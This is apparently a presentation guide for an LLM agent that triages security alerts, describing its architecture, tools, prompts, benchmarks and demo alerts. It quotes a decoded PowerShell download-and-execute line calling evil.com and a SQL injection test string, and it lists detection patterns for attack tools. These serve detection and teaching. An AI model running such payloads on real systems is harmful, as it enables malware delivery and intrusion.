# SOC Analyst Deep Agent — Presentation Guide

## 1. Project Overview

We built an **Autonomous AI Agent** that acts as a Tier-1 SOC (Security Operations Center) Analyst. It takes security alerts as input and produces structured verdicts: **Malicious**, **Benign**, or **Suspicious** — with confidence scores, reasoning, and MITRE ATT&CK technique mappings.

**Key stats:**
- 100% accuracy on 20 alerts, 95.7% on 600 alerts
- $0.006 per alert (half a cent)
- 11.5s average latency
- 10 custom tools, 3 specialist subagents
- Purely agentic — zero hardcoded rules

---

## 2. Core AI Concepts Used

### 2.1 Chain-of-Thought (CoT) Reasoning

Chain-of-Thought prompting makes the LLM "think step by step" before answering. Instead of jumping to a verdict, the agent breaks down its reasoning:

1. "What IPs are involved? Are they internal or external?"
2. "What does the log payload contain? Any attack signatures?"
3. "What is the user behavior? Off-hours? Privilege escalation?"
4. "Combining all evidence: what is the verdict?"

**How we implement it:** Our coordinator prompt instructs the agent to use `write_todos` to plan investigation steps before calling any tools. This forces structured thinking before action.

### 2.2 ReAct Loop (Reasoning + Acting)

ReAct combines reasoning (thinking) with acting (tool calls) in an iterative loop:

```
Observe alert -> Think (what do I need to investigate?) 
    -> Act (call a tool) -> Observe result 
    -> Think (what does this mean?) -> Act (call another tool) 
    -> ... -> Final verdict
```

**Our implementation:**
1. Coordinator receives alert
2. Plans investigation via `write_todos` (Reasoning)
3. Delegates to subagent via `task` tool (Acting)
4. Subagent calls its tools (e.g., ip_reputation, log_pattern) (Acting)
5. Subagent returns findings (Observation)
6. Coordinator reasons about combined findings (Reasoning)
7. Outputs VERDICT_JSON (Final Action)

The key difference from a simple classifier: the agent **decides** which tools to call based on the alert content. A DNS tunneling alert triggers different tools than a brute-force attack.

### 2.3 LangChain Deep Agents Framework

We use the `deepagents` library (built on LangChain + LangGraph). Deep Agents provide:

- **Coordinator pattern**: A main agent that plans and delegates to subagents
- **`write_todos` tool**: Built-in planning — the coordinator writes an investigation plan before acting
- **`task` tool**: Built-in delegation — the coordinator assigns tasks to specialist subagents
- **Checkpointer (MemorySaver)**: Maintains conversation state throughout the investigation of a single alert — the coordinator remembers what subagents reported
- **Tool binding**: Each subagent has its own set of tools — they can only call the tools assigned to them

**Why Deep Agents over plain LangChain?**
- Plain LangChain agents put all tools in one agent — with 11 tools, the LLM gets confused about which to call
- Deep Agents let us decompose: coordinator plans, subagents specialize
- Built-in `write_todos` + `task` tools enforce structured investigation

---

## 3. System Architecture

```
                    ALERT (JSON)
                        |
                        v
            +---------------------------+
            |   Coordinator-MainAgent   |
            |   (Gemini 2.5 Flash)      |
            |                           |
            |   1. write_todos (plan)   |
            |   2. task (delegate)      |
            |   3. synthesize verdict   |
            +--+--------+----------+---+
               |        |          |
               v        v          v
        +---------+ +--------+ +---------+
        | Network | | Log &  | | User    |
        | Intel   | | Payload| | Behavior|
        | Agent   | | Agent  | | Agent   |
        | 7 tools | | 3 tools| | 1 tool  |
        +---------+ +--------+ +---------+
               |        |          |
               v        v          v
            +---------------------------+
            |   Coordinator synthesizes |
            |   all findings into       |
            |   VERDICT_JSON            |
            +---------------------------+
                        |
                        v
              { verdict, confidence,
                reasoning, mitre,
                actions, tools }
```

### How it works step by step:

1. **Alert arrives** as JSON with source_ip, destination_ip, log_payload, event_type
2. **Coordinator receives alert** and calls `write_todos` to plan (e.g., "Step 1: Check IP reputation, Step 2: Analyze log patterns, Step 3: Check user behavior")
3. **Coordinator delegates** to subagents via `task` tool — it chooses which subagents based on alert content:
   - If alert has IPs/domains → delegates to network_intel_agent
   - If alert has log entries/payloads → delegates to log_payload_agent
   - If alert has usernames/login events → delegates to user_behavior_agent
4. **Each subagent calls its tools** and returns structured findings
5. **Coordinator reads all subagent reports** and synthesizes a final verdict
6. **VERDICT_JSON is parsed** by our code and returned as a Pydantic VerdictOutput

### Memory (Checkpointer)

Each alert investigation gets its own `thread_id` via LangGraph's MemorySaver. This means:
- The coordinator remembers what it planned (write_todos)
- It remembers what each subagent reported
- It can reason across all findings when synthesizing the verdict
- Different alerts are isolated — no cross-contamination

---

## 4. The 10 Custom Tools (+ 1 Merged Tool)

### Network Intelligence Subagent (7 tools)

**Tool 1: ip_full_profile** (Preferred — runs 3 lookups in parallel)
- Calls ip_reputation + geoip + threat_intel simultaneously
- Returns merged profile: abuse score, country, VPN/proxy detection, OTX pulse count
- Saves 2-4 seconds vs calling tools individually

**Tool 2: ip_reputation**
- Queries AbuseIPDB + VirusTotal
- Returns: abuse_confidence_score (0-100), is_malicious flag, ISP, usage_type
- 24-hour disk cache to avoid repeated API calls
- Example: "IP 45.133.1.22 has abuse confidence 95%, flagged by VirusTotal"

**Tool 3: geoip_lookup**
- Queries ip-api.com (free, no API key needed)
- Returns: country, city, ISP, is_vpn, is_tor, is_proxy
- Flags high-risk countries and anonymizing infrastructure
- 1-hour cache
- Example: "IP geolocates to Russia, using a VPN"

**Tool 4: dns_lookup**
- Resolves hostnames using dnspython
- Calculates DGA score (Domain Generation Algorithm detection)
- Calculates DNS tunnel score
- DGA score > 0.5 suggests C2 infrastructure
- Example: "datachunk5543.baddomain.com has DGA score 0.78 — likely C2"

**Tool 5: whois_lookup**
- Looks up domain registration info
- Returns: domain_age_days, registrar, is_private_registration
- Domains < 30 days old = strong phishing/C2 indicator
- 7-day cache
- Example: "evil-payload.com registered 3 days ago with privacy protection"

**Tool 6: threat_intel_lookup**
- Queries AlienVault OTX (Open Threat Exchange) — free API
- Returns: pulse_count (number of threat reports), malware_families, threat_tags
- pulse_count >= 3 = known malicious indicator
- Example: "IP appears in 12 OTX threat reports, linked to Cobalt Strike"

**Tool 7: network_traffic_analyzer**
- Analyzes network flow metadata (not packet capture)
- Detects: large transfers (>1GB), off-hours activity, suspicious ports (4444, 6667, 9001)
- Flags internal-to-external transfer anomalies
- Example: "4.5GB outbound at 3AM on port 443 — exfiltration pattern"

### Log & Payload Subagent (3 tools)

**Tool 8: log_pattern_analyzer**
- Matches log text against 40+ MITRE ATT&CK regex patterns
- Covers: brute force (T1110), credential dumping (T1003), lateral movement (T1021), ransomware (T1486), C2 beaconing (T1071), web attacks (T1190 — SQLi, XSS, Log4Shell), LOLBin abuse (T1059), Kerberos attacks, data staging
- Returns: matched_patterns with MITRE IDs, confidence scores, anomaly_score (0-1)
- Also detects benign indicators (system updates, admin reads, backups)
- Example: "Matched T1190 (SQL Injection) with confidence 0.95 — `' OR '1'='1` pattern"

**Tool 9: payload_decoder**
- Decodes multi-layer obfuscated payloads: base64 → URL encoding → hex → gzip
- Keeps decoding until no more layers found
- Extracts IOCs (Indicators of Compromise): IPs, domains, URLs, shell commands
- Detects suspicious content: PowerShell IEX, DownloadString, mimikatz, Log4Shell, shellcode
- Example: "Decoded base64 `SQBFAFgA...` → reveals `IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`"

**Tool 10: cve_lookup**
- Queries NVD (National Vulnerability Database) API
- Returns: CVSS score, severity, description, affected products
- Pre-cached for 6 critical CVEs: Log4Shell (CVE-2021-44228), EternalBlue (CVE-2017-0144), ProxyLogon (CVE-2021-26855), BlueKeep (CVE-2019-0708), and 2 more
- 7-day cache for API results
- Example: "CVE-2021-44228 (Log4Shell) — CVSS 10.0, Critical, remote code execution"

### User Behavior Subagent (1 tool)

**Tool 11: user_behavior_analyzer**
- Scores user risk across 10 behavioral signals:
  1. Off-hours access (login at 3AM)
  2. Impossible travel (NY then Tokyo in 30 min)
  3. Privilege escalation (adding self to sudoers)
  4. First-time resource access
  5. Mass file access (reading 500 files in 1 minute)
  6. Failed login count (>10 = brute force)
  7. Admin account activity from unusual source
  8. Service account doing interactive tasks
  9. Sensitive resource access (HR, finance, secrets)
  10. Abnormally long sessions
- Returns: risk_score (0.0-1.0), risk_level (Low/Medium/High/Critical), anomaly_flags
- Stateless — scores based on log text only (acknowledged limitation)
- Example: "Risk score 0.85 (Critical) — impossible travel + privilege escalation + admin account"

---

## 5. Prompt Engineering

### Coordinator Prompt (~1,500 lines)

The coordinator-mainagent uses a detailed system prompt with:

**PICERL Persona**: The agent follows the SOC analyst PICERL methodology:
- **P**reparation: Plan what to investigate
- **I**dentification: Identify indicators of compromise
- **C**ontainment: Recommend containment actions
- **E**radication: Suggest removal steps
- **R**ecovery: Recommend recovery actions
- **L**essons Learned: Document findings

**26 Investigation Rules** including:
- Skip network_intel when all IPs are private (RFC1918) — saves 5s with no signal
- Trust high-confidence tool matches (>=0.85 anomaly_score)
- Known-benign patterns: internal transfers, VPN sessions, sysadmin reads, AD scripts
- High-risk patterns: service installs in temp dirs, admin email changes, kernel drivers
- Confidence calibration: 0.95-1.00 for multi-signal confirmed attacks, 0.70-0.95 for confirmed benign

**Anti-hallucination measures:**
- "Do NOT invent tool results — only use data returned by actual tool calls"
- "Do NOT call tools that don't exist in your tool list"
- Retry mechanism: if VERDICT_JSON is malformed, agent is re-prompted up to 2 times

**Output format enforcement:**
- Coordinator must output `VERDICT_JSON: {...}` block
- Parsed by regex in agent.py
- Validated against Pydantic VerdictOutput schema (verdict must be Malicious/Benign/Suspicious, confidence 0.0-1.0)

### Subagent Prompts

Each subagent has a focused prompt:
- **Network agent**: "You are a network threat analyst. Use your tools to investigate IPs, domains, and network traffic. Report findings — do NOT make a verdict."
- **Log agent**: "You are a log analysis specialist. Match patterns against MITRE ATT&CK. Decode payloads. Report findings."
- **User behavior agent**: "You are a UEBA analyst. Score behavioral risk. Report anomalies."

Key: Subagents report findings. Only the coordinator makes the final verdict.

---

## 6. Web Dashboard (Chainlit)

The dashboard provides:

1. **Input formats**: Plain text, JSON, CSV, file upload
2. **Real-time reasoning trace**: Shows coordinator thinking, tool calls, subagent results as they happen
3. **Verdict card**: Color-coded (red/yellow/green) with confidence bar, MITRE techniques, recommended actions, main & subagents used, tools used
4. **Batch mode**: Upload multiple alerts, get summary table with agents and tools per alert
5. **Model selector**: Cloud (OpenRouter) and Local (Ollama) in separate dropdowns
6. **Info buttons**: Architecture, Tools, Benchmarks, Run Demo — clickable action buttons on welcome screen
7. **Commands**: `/architecture`, `/tools`, `/benchmarks`, `/demo`

### Model Options:
- **Cloud models (OpenRouter)**: 8 models including Gemini 2.5 Flash (recommended), Grok, DeepSeek, GPT-4.1-mini, Claude Haiku, Llama, Qwen
- **Local models (Ollama)**: 6 models including Llama 3.1, Llama 3.2, Mistral, Qwen 2.5, DeepSeek-R1, Gemma 2 — runs fully offline, no API key needed
- **Custom model**: User can type any model name and select the provider type (Cloud or Local)

### Dashboard Architecture:
- Built with Chainlit 2.x (Python framework for LLM apps)
- `run_agent_stream()` yields events: thought, tool_call, tool_result, verdict
- Each event is rendered as a collapsible step in the UI
- Async execution — UI stays responsive during investigation
- Agent is automatically rebuilt when model/provider changes

---

## 7. Benchmark Results

### Accuracy Across Dataset Sizes

| Dataset    | Accuracy         | Malicious Recall | Benign Precision | Avg Latency | Cost     |
|------------|-----------------|------------------|------------------|-------------|----------|
| 20 alerts  | 100% (20/20)    | 100% (10/10)     | 100% (10/10)     | 11.5s       | ~$0.11   |
| 65 alerts  | 98.5% (64/65)   | 100% (43/43)     | 95% (21/22)      | 16.9s       | ~$0.37   |
| 200 alerts | 97.5% (195/200) | 98% (109/111)    | 97% (86/89)      | 17.5s       | ~$1.14   |
| 600 alerts | 95.7% (574/600) | 96% (327/340)    | 95% (247/260)    | 12.0s       | ~$3.46   |

### Model Comparison (12+ models tested)

| Model                          | Accuracy | Avg Latency | Cost/20 alerts |
|--------------------------------|----------|-------------|----------------|
| google/gemini-2.5-flash        | 100%     | 11.5s       | $0.11          |
| x-ai/grok-4.1-fast             | 95%      | 41.4s       | $0.08          |
| anthropic/claude-3.5-haiku     | 95%      | 55.2s       | $0.56          |
| openai/gpt-4.1-mini            | 95%      | 21.4s       | —              |
| deepseek/deepseek-chat         | 90%      | 43.0s       | $0.06          |
| google/gemini-2.5-flash-lite   | 85-90%   | 11.3s       | $0.05          |
| meta-llama/llama-3.3-70b       | 85%      | 38.4s       | $0.05          |
| openai/gpt-4.1-nano            | 70%      | 52.3s       | —              |

**Why Gemini 2.5 Flash?** Best combination of accuracy (100%), speed (11.5s), and cost ($0.006/alert).

### Cost Analysis
- $0.006 per alert = $6 per 1,000 alerts
- A human Tier-1 analyst: ~$40/hour, handles ~20 alerts/hour = $2/alert
- Our agent is **333x cheaper** than a human analyst

### Common Failure Patterns
1. **Internal-only attacks** (RFC1918 IPs): Tools return clean results because external APIs have no data on private IPs
2. **UEBA false positives**: user_behavior_analyzer over-flags mass access or privilege signals on legitimate admin activity
3. **Subtle cloud attacks**: Cloud API policy changes (PutRolePolicy with AdminAccess) look routine to log analysis

---

## 8. Code Structure

```
soc-agent/
├── agent.py           # Coordinator-mainagent (308 lines, pure agentic)
├── subagents.py       # 3 SubAgent definitions
├── tool_registry.py   # 10 @tool wrappers
├── models.py          # AlertInput, VerdictOutput, ToolResult (Pydantic)
├── config.py          # Settings (OpenRouter/Claude/Ollama)
├── dashboard.py       # Chainlit web UI
├── benchmark.py       # Accuracy + latency + cost tracker
├── prompts/
│   ├── coordinator.py # Coordinator system prompt
│   ├── network_agent.py
│   ├── log_agent.py
│   └── user_agent.py
├── tools/             # 11 tool implementations
├── tests/             # 183 tests
├── demo/              # 4 demo scenarios
└── paper/paper.md     # Research paper
```

### Key Design Decisions
- **Pure agentic**: No hardcoded rules, regex pre-filters, or if/else verdict logic
- **Modular**: Each component is independent — swap a tool without touching the coordinator
- **Multi-provider**: Supports cloud (OpenRouter) and local (Ollama) LLMs — switch from the dashboard
- **Graceful degradation**: When APIs are down, tools return `data_source="unavailable"` and the coordinator lowers confidence
- **Cost-efficient**: diskcache caches API responses (24h for IP reputation, 7d for CVE/WHOIS)

---

## 9. Testing (183 Tests)

| Test File           | Tests | What It Covers                                    |
|---------------------|-------|---------------------------------------------------|
| test_tools.py       | 52    | All 10 tools — inputs, outputs, edge cases        |
| test_prompts.py     | 39    | Prompt loading, rules, MITRE coverage, format      |
| test_agent.py       | 15    | Agent build, verdict parsing, tool registry        |
| test_dashboard.py   | 27    | Input parsing (text, JSON, CSV), verdict cards     |
| test_edge_cases.py  | 34    | Private IPs, IPv6, missing fields, malformed JSON  |
| test_bonus.py       | 15    | Claude caching, Suspicious verdict, MITRE coverage |

Run: `make test` — all 183 pass, 3 skipped (LLM integration tests need API key)

---

## 10. Live Demo Script

### Demo Alert 1: SQL Injection (Malicious)
Paste this into the dashboard:
```json
{"alert_id":"evt_5501","timestamp":"2026-04-12T09:15:30Z","source_ip":"45.133.1.22","destination_ip":"192.168.1.10","service":"http_server","log_payload":"GET /login.php?user=admin%27+OR+%271%27%3D%271 HTTP/1.1 - 403 Forbidden - User-Agent: sqlmap/1.5"}
```
**What to explain:** "The coordinator delegated to log_payload_agent which decoded the URL encoding and matched the SQL injection pattern `' OR '1'='1`. The network_intel_agent checked the source IP reputation. The coordinator combined both findings and concluded Malicious at 95% confidence."

### Demo Alert 2: Benign System Update
```json
{"alert_id":"evt_1023","timestamp":"2026-04-12T00:00:05Z","source_ip":"192.168.1.5","destination_ip":"archive.ubuntu.com","service":"os_kernel","log_payload":"root_user executed: 'sudo apt-get update && sudo apt-get upgrade -y'. Downloaded 150MB packages."}
```
**What to explain:** "The agent recognized this as a routine system update — apt-get to archive.ubuntu.com by root. No attack patterns found. Verdict: Benign at 95%. This shows the agent can distinguish administrative tasks from threats."

### Demo Alert 3: Obfuscated PowerShell (Malicious)
Upload file: `demo/scenarios/02_obfuscated_powershell.json`
**What to explain:** "This is the most impressive demo. The payload_decoder tool decoded the base64-encoded PowerShell command and found `IEX(DownloadString('http://evil.com/...'))` — a classic malware download technique. The agent correctly identified it as Malicious with MITRE technique T1059.001 (PowerShell)."

### Demo Alert 4: Upload 20-alert batch
Upload `tests/fixtures/sample_alerts.json`
**What to explain:** "Here we process 20 alerts in batch mode. The dashboard shows each investigation and produces a summary table. 100% accuracy — all 10 malicious caught, all 10 benign cleared."

---

## 11. Anticipated Questions & Answers

**Q: Why 3 subagents instead of 1 big agent?**
A: Tool overload. With 11 tools in one agent, the LLM gets confused about which to call. Subagents specialize — like a real SOC team with network, log, and UEBA specialists. Each subagent has a focused prompt and only sees its relevant tools.

**Q: Is it really agentic? How is it different from a classifier?**
A: A classifier takes input and outputs a label. Our agent *reasons* — it plans investigation steps, decides which tools to call based on the alert content, executes those tools, reads the results, and synthesizes a verdict. Show agent.py: 308 lines, no if/else verdict logic. The LLM makes every decision.

**Q: What about the hidden 500-alert test set?**
A: We tested on 600 alerts and achieved 95.7% accuracy. The pipeline is ready. At $0.006/alert, the hidden test would cost about $3.

**Q: Why Gemini 2.5 Flash and not GPT-4 or Claude?**
A: We tested 12+ models. Gemini 2.5 Flash gave the best combination: 100% accuracy on our core benchmark, 11.5s latency, and lowest cost. GPT-4.1-mini was 95% but slower. Claude Haiku was 95% but 50x more expensive.

**Q: How do you prevent hallucinations?**
A: Three layers: (1) Coordinator prompt explicitly says "do NOT invent tool results," (2) VERDICT_JSON parsing with 2 retries if malformed, (3) Pydantic schema validation ensures output matches the required format.

**Q: What are the limitations?**
A: (1) Stateless UEBA — we don't track user behavior over time, (2) Private IP blind spot — external APIs have no data on internal IPs, (3) API dependency — 5 tools need external APIs, though they degrade gracefully.

**Q: How does memory work?**
A: LangGraph MemorySaver creates a conversation thread per alert. The coordinator remembers its plan and all subagent reports throughout the investigation. Different alerts are isolated via unique thread_ids.

**Q: What is the cost at scale?**
A: $0.006/alert. 1,000 alerts = $6. A human analyst at $40/hour handling 20 alerts/hour costs $2/alert — we're 333x cheaper.

**Q: Can it run without an API key / offline?**
A: Yes. The dashboard supports local LLMs via Ollama. Install Ollama, pull a model (e.g., `ollama pull llama3.1`), select it from the Local Model dropdown — no API key or internet needed for the LLM. Some tools still call external APIs for threat intel, but they degrade gracefully when offline.

**Q: What models are supported?**
A: Cloud: 8 models via OpenRouter (Gemini, GPT, Claude, Grok, DeepSeek, Llama, Qwen). Local: 6 models via Ollama (Llama 3.1/3.2, Mistral, Qwen 2.5, DeepSeek-R1, Gemma 2). Plus any custom model the user types in.

---

## 12. Key Terminology Quick Reference

| Term | Definition |
|------|-----------|
| SOC | Security Operations Center — monitors and responds to security alerts |
| Tier-1 Analyst | Entry-level SOC role that triages alerts as malicious or benign |
| MITRE ATT&CK | Framework cataloging attack techniques (e.g., T1190 = web exploit) |
| CoT | Chain-of-Thought — prompting technique for step-by-step reasoning |
| ReAct | Reasoning + Acting loop — think, act, observe, repeat |
| PICERL | SOC methodology: Preparation, Identification, Containment, Eradication, Recovery, Lessons |
| UEBA | User and Entity Behavior Analytics — detecting anomalous user activity |
| DGA | Domain Generation Algorithm — malware generates random domain names for C2 |
| C2 | Command and Control — attacker's communication channel to compromised systems |
| IOC | Indicator of Compromise — evidence of a breach (malicious IP, domain, hash) |
| SOAR | Security Orchestration, Automation and Response — automates incident response |
| LangGraph | LangChain's graph-based agent runtime with state management |
| Deep Agents | LangChain framework for coordinator + subagent architectures |
| OpenRouter | API gateway that routes to multiple LLM providers |
